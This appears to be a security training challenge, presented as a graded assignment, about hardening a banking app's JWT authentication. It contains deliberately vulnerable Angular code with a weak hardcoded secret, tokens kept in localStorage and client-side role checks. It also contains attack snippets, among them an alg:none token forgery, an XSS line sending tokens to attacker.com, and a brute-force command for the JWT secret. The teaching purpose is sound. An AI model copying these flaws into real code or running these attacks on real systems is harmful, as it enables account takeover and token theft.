# Challenge 2: JWT Security & Session Management

**Difficulty:** 5/5  
**Estimated Time:** 3-4 hours  
**Points:** 20 (+ 5 bonus)

---

## Scenario

You're tasked with securing the authentication system for a banking application. The current implementation uses JWT tokens but has multiple critical security flaws that could allow account takeover, unauthorized transactions, and session hijacking.

**Business Requirements:**
- Secure user authentication with JWT
- Session management with automatic refresh
- Support for multiple devices
- Logout from all devices capability
- Suspicious activity detection

**Security Requirements:**
- Prevent JWT algorithm confusion attacks
- Secure token storage and transmission
- Implement token rotation
- Detect and prevent token theft
- Proper token expiration and validation
- Session revocation capability

---

## Vulnerable Code

### `auth.service.ts`

```typescript
import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Observable } from 'rxjs';
import { tap } from 'rxjs/operators';

interface LoginResponse {
  token: string;
  refreshToken: string;
  user: any;
}

@Injectable({
  providedIn: 'root'
})
export class AuthService {
  
  constructor(private http: HttpClient) {}
  
  login(username: string, password: string): Observable<LoginResponse> {
    return this.http.post<LoginResponse>('/api/auth/login', { username, password })
      .pipe(
        tap(response => {
          // VULNERABILITY: Storing JWT in localStorage
          localStorage.setItem('token', response.token);
          localStorage.setItem('refreshToken', response.refreshToken);
          localStorage.setItem('user', JSON.stringify(response.user));
        })
      );
  }
  
  getToken(): string | null {
    // VULNERABILITY: No token expiration check
    return localStorage.getItem('token');
  }
  
  refreshToken(): Observable<any> {
    const refreshToken = localStorage.getItem('refreshToken');
    
    // VULNERABILITY: No validation of refresh token
    return this.http.post('/api/auth/refresh', { refreshToken })
      .pipe(
        tap((response: any) => {
          // VULNERABILITY: Not rotating tokens
          localStorage.setItem('token', response.token);
        })
      );
  }
  
  logout(): void {
    // VULNERABILITY: Only local logout, no server-side invalidation
    localStorage.removeItem('token');
    localStorage.removeItem('refreshToken');
  }
  
  isAuthenticated(): boolean {
    // VULNERABILITY: Checking only token existence, not validity
    return !!this.getToken();
  }
  
  // VULNERABILITY: Client-side JWT decoding exposes structure
  decodeToken(token: string): any {
    try {
      const payload = token.split('.')[1];
      return JSON.parse(atob(payload));
    } catch {
      return null;
    }
  }
}
```

### `jwt.interceptor.ts`

```typescript
import { Injectable } from '@angular/core';
import { HttpInterceptor, HttpRequest, HttpHandler, HttpEvent } from '@angular/common/http';
import { Observable } from 'rxjs';
import { AuthService } from './auth.service';

@Injectable()
export class JwtInterceptor implements HttpInterceptor {
  
  constructor(private authService: AuthService) {}
  
  intercept(req: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {
    const token = this.authService.getToken();
    
    if (token) {
      // VULNERABILITY: Sending token to all domains
      const cloned = req.clone({
        headers: req.headers.set('Authorization', `Bearer ${token}`)
      });
      return next.handle(cloned);
    }
    
    // VULNERABILITY: No automatic token refresh on expiration
    return next.handle(req);
  }
}
```

### `backend-mock.service.ts` (Simulating backend vulnerabilities)

```typescript
import { Injectable } from '@angular/core';
import * as jwt from 'jsonwebtoken';

@Injectable({
  providedIn: 'root'
})
export class BackendMockService {
  
  private SECRET = 'secret123'; // VULNERABILITY: Weak secret
  
  generateToken(user: any): string {
    // VULNERABILITY: Algorithm not specified, enabling confusion attacks
    return jwt.sign(
      { 
        userId: user.id,
        username: user.username,
        role: user.role // VULNERABILITY: Role in client-modifiable token
      },
      this.SECRET,
      { expiresIn: '1h' }
    );
  }
  
  verifyToken(token: string): any {
    try {
      // VULNERABILITY: Algorithm set to 'none' would bypass verification
      return jwt.verify(token, this.SECRET);
    } catch (error) {
      return null;
    }
  }
  
  // VULNERABILITY: Refresh tokens never expire or rotate
  private refreshTokens: Map<string, any> = new Map();
  
  generateRefreshToken(userId: string): string {
    const refreshToken = Math.random().toString(36).substring(2);
    this.refreshTokens.set(refreshToken, { userId, createdAt: Date.now() });
    return refreshToken;
  }
  
  validateRefreshToken(token: string): boolean {
    // VULNERABILITY: No expiration check
    return this.refreshTokens.has(token);
  }
}
```

### `account.component.ts`

```typescript
import { Component, OnInit } from '@angular/core';
import { AuthService } from './auth.service';

@Component({
  selector: 'app-account',
  template: `
    <div class="account">
      <h2>Account: {{ user?.username }}</h2>
      <p>Role: {{ user?.role }}</p>
      
      <!-- VULNERABILITY: Displaying sensitive token data -->
      <div class="debug">
        <h3>Debug Info:</h3>
        <pre>{{ tokenData | json }}</pre>
      </div>
      
      <button (click)="makeTransaction()">Transfer Money</button>
    </div>
  `
})
export class AccountComponent implements OnInit {
  user: any;
  tokenData: any;
  
  constructor(private authService: AuthService) {}
  
  ngOnInit(): void {
    const token = this.authService.getToken();
    if (token) {
      // VULNERABILITY: Trusting client-side decoded token
      this.tokenData = this.authService.decodeToken(token);
      this.user = this.tokenData;
    }
  }
  
  makeTransaction(): void {
    // VULNERABILITY: Using client-side token data for authorization
    if (this.tokenData.role === 'admin') {
      console.log('Admin transaction allowed');
      // Process transaction
    }
  }
}
```

---

## Attack Scenarios

### Attack 1: Algorithm Confusion
```typescript
// Attacker changes algorithm to 'none'
const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }));
const payload = btoa(JSON.stringify({ userId: 1, role: 'admin' }));
const maliciousToken = `${header}.${payload}.`;
```

### Attack 2: Token Theft from localStorage
```javascript
// XSS allows stealing tokens
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
```

### Attack 3: Role Escalation
```typescript
// Decode token, modify role, re-encode
const decoded = jwt_decode(token);
decoded.role = 'admin';
const newToken = base64(header) + '.' + base64(decoded) + '.signature';
```

### Attack 4: Replay Attack
```typescript
// Reuse old valid token after logout
const oldToken = interceptedToken;
// Use oldToken to make requests
```

### Attack 5: Refresh Token Abuse
```typescript
// Infinite token generation with single refresh token
while(true) {
  const newToken = await refresh(refreshToken);
  // refreshToken never expires or rotates
}
```

### Attack 6: JWT Secret Brute Force
```bash
# Weak secret can be brute forced
john jwt.txt --wordlist=common-secrets.txt
```

### Attack 7: Session Fixation
```typescript
// Attacker sets victim's token
localStorage.setItem('token', attackerControlledToken);
// Victim logs in, but still uses attacker's token
```

---

## Your Tasks

### Task 1: Identify All Vulnerabilities (4 pts)

Create `VULNERABILITIES.md` documenting:
1. JWT implementation flaws
2. Storage vulnerabilities
3. Token validation issues
4. Session management problems
5. Each with OWASP category and severity

**Hint:** There are at least 15 distinct vulnerabilities.

### Task 2: Implement Secure JWT System (8 pts)

Fix the code to:

1. **Secure Token Storage**
   - Never store JWT in localStorage
   - Use httpOnly cookies for tokens
   - Implement secure cookie flags
   - Consider using BroadcastChannel for multi-tab sync

2. **Implement Token Rotation**
   - Rotate access tokens on refresh
   - Rotate refresh tokens after use
   - Implement token family tracking
   - Detect token reuse attacks

3. **Proper Token Validation**
   - Verify signature server-side
   - Check expiration timestamps
   - Validate issuer and audience claims
   - Implement algorithm whitelist

4. **Secure Interceptor**
   - Only send tokens to allowed origins
   - Implement automatic refresh on 401
   - Handle concurrent requests during refresh
   - Implement retry logic with backoff

5. **Server-side Session Management**
   - Maintain session database
   - Implement logout from all devices
   - Track suspicious activities
   - Implement session timeout

6. **Cryptographic Best Practices**
   - Use strong secrets (256-bit minimum)
   - Implement HMAC-SHA256 or better
   - Secure random generation for tokens
   - Consider using RS256 for asymmetric signing

### Task 3: Write Security Tests (4 pts)

```typescript
describe('JWT Security', () => {
  it('should reject tokens with algorithm: none', () => {});
  it('should not accept expired tokens', () => {});
  it('should rotate refresh tokens', () => {});
  it('should detect token reuse', () => {});
  it('should only send tokens to whitelisted domains', () => {});
  it('should handle concurrent refresh requests', () => {});
  it('should invalidate tokens on logout', () => {});
  it('should prevent role tampering', () => {});
  it('should use httpOnly cookies', () => {});
  it('should detect suspicious login patterns', () => {});
});
```

### Task 4: Document Fixes (2 pts)

Create `FIXES.md` with detailed explanations.

### Task 5: Copilot Usage Report (2 pts)

Create `COPILOT_USAGE.md`.

---

## Bonus Challenges (5 pts)

### Bonus 1: Implement Device Fingerprinting (2 pts)
```typescript
class DeviceFingerprintService {
  async generateFingerprint(): Promise<string> {
    const components = [
      navigator.userAgent,
      navigator.language,
      screen.colorDepth,
      screen.width + 'x' + screen.height,
      new Date().getTimezoneOffset(),
      this.getCanvas(),
      this.getWebGL()
    ];
    return this.hash(components.join('|'));
  }
}
```

### Bonus 2: Anomaly Detection (1 pt)
```typescript
// Detect suspicious login patterns
class AnomalyDetectionService {
  detectSuspicious(loginData: LoginAttempt): boolean {
    // Check for: impossible travel, unusual time, new device, etc.
  }
}
```

### Bonus 3: JWT Key Rotation (1 pt)
```typescript
// Implement automatic JWT signing key rotation
class KeyRotationService {
  private keys: Map<string, CryptoKey>;
  rotateKeys(interval: number): void { /* rotate signing keys */ }
}
```

### Bonus 4: WebAuthn Support (1 pt)
```typescript
// Add hardware security key support
class WebAuthnService {
  async register(): Promise<Credential> { /* WebAuthn registration */ }
  async authenticate(): Promise<boolean> { /* WebAuthn auth */ }
}
```

---

## Security Requirements Checklist

- [ ] Tokens stored in httpOnly cookies only
- [ ] Strong JWT secrets (256-bit minimum)
- [ ] Algorithm explicitly specified and validated
- [ ] Token expiration properly checked
- [ ] Refresh token rotation implemented
- [ ] Token reuse detection active
- [ ] Server-side session invalidation working
- [ ] Tokens only sent to whitelisted origins
- [ ] Concurrent refresh handling implemented
- [ ] Role verification done server-side
- [ ] Device fingerprinting (bonus)
- [ ] Anomaly detection (bonus)
- [ ] All security tests passing

---

## Testing Your Solution

### Manual Testing:
```bash
# Test algorithm confusion
curl -H "Authorization: Bearer ${NONE_ALG_TOKEN}" http://localhost:4200/api/account

# Test expired token
# (Wait for expiration or manually create expired token)

# Test token rotation
# Login, refresh multiple times, verify old tokens invalid

# Test logout from all devices
# Login from multiple browsers, logout from one, verify all sessions terminated
```

### Automated Testing:
```bash
npm run test:security
npm run test:jwt
```

---

## Resources

- [JWT Best Practices](https://datatracker.ietf.org/doc/html/rfc8725)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [JWT.io Debugger](https://jwt.io/)
- [Auth0 JWT Handbook](https://auth0.com/resources/ebooks/jwt-handbook)

---

**This is the most challenging assignment. Take your time and test thoroughly!** 
